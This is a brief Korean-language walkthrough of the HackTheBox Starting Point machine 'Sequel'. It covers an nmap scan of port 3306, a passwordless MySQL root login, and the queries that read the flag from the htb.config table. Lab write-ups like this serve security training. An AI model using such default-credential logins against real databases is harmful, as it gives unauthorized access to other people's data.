# Sequel - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 3306 -sC -sV -oA Sequel 10.129.95.232
```
<img width="1104" height="296" alt="image" src="https://github.com/user-attachments/assets/b8bb3cb8-1ab1-4870-9a0d-636fa2fc543c" />

- mysql(3306)

---
## Mysql
- 로그인 계정을 알 수 없기에 기본 사용자 이름으로 로그인을 시도해봄.
```bash
mysql -h10.129.95.232 -uroot --skip-ssl
```
<img width="1104" height="218" alt="image" src="https://github.com/user-attachments/assets/e56bfd20-a5fb-49b0-a9b8-c6d949ca7e55" />

- `htb` 데이터베이스의 `config`테이블에서 `flag` 데이터를 획득할 수 있음.
```sql
show databases;

use htb;

select * from config;
```
<img width="713" height="503" alt="image" src="https://github.com/user-attachments/assets/21749040-f9c2-4bb0-b5a3-08871779b976" />
